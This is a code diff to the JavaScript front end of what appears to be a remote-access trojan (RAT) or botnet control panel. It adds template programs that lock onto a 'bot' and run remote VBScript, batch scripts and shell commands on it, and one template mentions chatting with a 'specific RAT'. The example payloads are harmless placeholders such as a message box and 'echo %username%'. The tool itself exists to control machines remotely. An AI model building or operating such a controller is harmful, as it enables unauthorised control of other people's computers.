@@ -3,7 +3,7 @@ const typer = (x) => {
   type: "robot",
   hideClose: true,
   description: `Initializing Autopilot...`,
-  timeout: 1000,
+  timeout: 1500,
  });
  hotrelod = false;
  document.getElementById("backdrop").style.display = "block";
@@ -68,14 +68,15 @@ const shakeSpeare = (x, y) => {
   case 11:
    tale = `// |======================================================|\n// |  Program-11\n// |  Description: Terminates Cloning Operations.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.NClone(); // Halt Cloning\n\n`;
    break;
+
   case 12:
-   tale = "// |==============================================|\n// |  Program-12\n// |  Description: Play an mp3 audio on a specific system.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
+   tale = `// |======================================================|\n// |  Program-12\n// |  Description: Remote VBScript Execution.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Vbs(\`\nX=Msgbox("Message Here..",0+16,"Title..")\n\`);\n/*\nFormat: X + Y + Z\nX => 0: OK\n     1: OK, CANCEL\n     2: ABORT, RETRY,IGNORE\n     3: YES, NO, CANCEL\n     4: YES, NO\nY => 16: CRITICAL ICON\n     32: QUESTION ICON\n     48: WARNING ICON\n     64: INFO ICON\nZ => 0: NORMAL\n     4096: ALWAYS ON TOP\n*/\n\n`;
    break;
   case 13:
-   tale = "// |==============================================|\n// |  Program-13\n// |  Description: Show Timed message box on a specific host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
+   tale = `// |======================================================|\n// |  Program-13\n// |  Description: Remote .cmd/.bat script Execution.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Bat(\`\n@echo off\nREM This is a comment.\necho Hola!\npause\n\`);\n \n`;
    break;
   case 14:
-   tale = "// |==============================================|\n// |  Program-14\n// |  Description: Display Message box on a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
+   tale = `// |======================================================|\n// |  Program-14\n// |  Description: Remote Shell Execution.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Shell("echo %username%"); // Run Inline CMD Commands..\n\n`;
    break;
   case 15:
    tale = "// |==============================================|\n// |  Program-15\n// |  Description: Non-Maskable Chat with a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
